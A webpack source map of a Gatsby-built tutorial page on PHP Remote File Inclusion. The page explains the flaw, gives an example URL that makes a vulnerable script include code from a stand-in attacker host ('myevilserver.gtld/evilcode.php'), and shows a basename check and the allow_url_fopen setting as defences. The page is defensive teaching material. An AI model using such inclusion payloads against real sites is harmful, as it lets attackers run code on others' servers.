{"version":3,"sources":["webpack:///path---php-security-remote-file-inclusion-23fabc9ea813f662cf8c.js","webpack:///./.cache/json/php-security-remote-file-inclusion.json"],"names":["webpackJsonp","./node_modules/json-loader/index.js!./.cache/json/php-security-remote-file-inclusion.json","module","exports","data","markdownRemark","html","fields","slug","frontmatter","title","pathContext"],"mappings":"AAAAA,cAAc,qBAERC,4FACA,SAAUC,EAAQC,GCHxBD,EAAAC,SAAkBC,MAAQC,gBAAkBC,KAAA,6jEAA+uDC,QAAoYC,KAAA,wCAA8CC,aAAgBC,MAAA,2BAAkCC,aAAgBH,KAAA","file":"path---php-security-remote-file-inclusion-23fabc9ea813f662cf8c.js","sourcesContent":["webpackJsonp([2912571653162630700],{\n\n/***/ \"./node_modules/json-loader/index.js!./.cache/json/php-security-remote-file-inclusion.json\":\n/***/ (function(module, exports) {\n\n\tmodule.exports = {\"data\":{\"markdownRemark\":{\"html\":\"<h2>Remote File Inclusion</h2>\\n<p>A vulnerability in the application caused by the programmer requiring a file input provided by the user and not sanitizing the input before accessing the requested file. This results in a file being pulled from a remote server and included where it should not of been.</p>\\n<h3>Example remote file inclusion attacks</h3>\\n<p>A website allows you to view PDFs as <code>download.php?file=myfile.php</code>, due to a lack of proper checking a malicious user is able to request a remote resource and include in the script. The URL could become <code>download.php?file=http://myevilserver.gtld/evilcode.php</code> this could then be outputted to the user or in severe cases run the actual PHP code on your server.</p>\\n<h3>Defending your website from remote file inclusion attacks in PHP</h3>\\n<p>The following PHP code will provide strong protection against a remote file inclusion attacks</p>\\n<div class=\\\"gatsby-highlight\\\">\\n      <pre class=\\\"language-php\\\"><code><span class=\\\"token delimiter important\\\">&lt;?php</span>\\n<span class=\\\"token keyword\\\">if</span><span class=\\\"token punctuation\\\">(</span><span class=\\\"token function\\\">basename</span><span class=\\\"token punctuation\\\">(</span><span class=\\\"token variable\\\">$_GET</span><span class=\\\"token punctuation\\\">[</span><span class=\\\"token string\\\">'file]) !== $_GET['</span>file'<span class=\\\"token punctuation\\\">]</span><span class=\\\"token punctuation\\\">)</span> <span class=\\\"token punctuation\\\">{</span>\\n  <span class=\\\"token keyword\\\">die</span><span class=\\\"token punctuation\\\">(</span><span class=\\\"token string\\\">'INVALID FILE REQUESTED'</span><span class=\\\"token punctuation\\\">)</span><span class=\\\"token punctuation\\\">;</span>\\n<span class=\\\"token punctuation\\\">}</span>\\n</code></pre>\\n      </div>\\n<ul>\\n<li>You can disable <code>allow_url_fopen</code> in your php.ini file as an added protection against remote file inclusion.</li>\\n</ul>\\n<h4>More Information:</h4>\\n<ul>\\n<li><a href=\\\"https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion\\\" rel=\\\"nofollow\\\">OWASP Wiki - Testing for Remote File Inclusion</a></li>\\n</ul>\",\"fields\":{\"slug\":\"/php/security/remote-file-inclusion/\"},\"frontmatter\":{\"title\":\"Remote File Inclusion\"}}},\"pathContext\":{\"slug\":\"/php/security/remote-file-inclusion/\"}}\n\n/***/ })\n\n});\n\n\n// WEBPACK FOOTER //\n// path---php-security-remote-file-inclusion-23fabc9ea813f662cf8c.js","module.exports = {\"data\":{\"markdownRemark\":{\"html\":\"<h2>Remote File Inclusion</h2>\\n<p>A vulnerability in the application caused by the programmer requiring a file input provided by the user and not sanitizing the input before accessing the requested file. This results in a file being pulled from a remote server and included where it should not of been.</p>\\n<h3>Example remote file inclusion attacks</h3>\\n<p>A website allows you to view PDFs as <code>download.php?file=myfile.php</code>, due to a lack of proper checking a malicious user is able to request a remote resource and include in the script. The URL could become <code>download.php?file=http://myevilserver.gtld/evilcode.php</code> this could then be outputted to the user or in severe cases run the actual PHP code on your server.</p>\\n<h3>Defending your website from remote file inclusion attacks in PHP</h3>\\n<p>The following PHP code will provide strong protection against a remote file inclusion attacks</p>\\n<div class=\\\"gatsby-highlight\\\">\\n      <pre class=\\\"language-php\\\"><code><span class=\\\"token delimiter important\\\">&lt;?php</span>\\n<span class=\\\"token keyword\\\">if</span><span class=\\\"token punctuation\\\">(</span><span class=\\\"token function\\\">basename</span><span class=\\\"token punctuation\\\">(</span><span class=\\\"token variable\\\">$_GET</span><span class=\\\"token punctuation\\\">[</span><span class=\\\"token string\\\">'file]) !== $_GET['</span>file'<span class=\\\"token punctuation\\\">]</span><span class=\\\"token punctuation\\\">)</span> <span class=\\\"token punctuation\\\">{</span>\\n  <span class=\\\"token keyword\\\">die</span><span class=\\\"token punctuation\\\">(</span><span class=\\\"token string\\\">'INVALID FILE REQUESTED'</span><span class=\\\"token punctuation\\\">)</span><span class=\\\"token punctuation\\\">;</span>\\n<span class=\\\"token punctuation\\\">}</span>\\n</code></pre>\\n      </div>\\n<ul>\\n<li>You can disable <code>allow_url_fopen</code> in your php.ini file as an added protection against remote file inclusion.</li>\\n</ul>\\n<h4>More Information:</h4>\\n<ul>\\n<li><a href=\\\"https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion\\\" rel=\\\"nofollow\\\">OWASP Wiki - Testing for Remote File Inclusion</a></li>\\n</ul>\",\"fields\":{\"slug\":\"/php/security/remote-file-inclusion/\"},\"frontmatter\":{\"title\":\"Remote File Inclusion\"}}},\"pathContext\":{\"slug\":\"/php/security/remote-file-inclusion/\"}}\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./~/json-loader!./.cache/json/php-security-remote-file-inclusion.json\n// module id = ./node_modules/json-loader/index.js!./.cache/json/php-security-remote-file-inclusion.json\n// module chunks = 2912571653162630700"],"sourceRoot":""}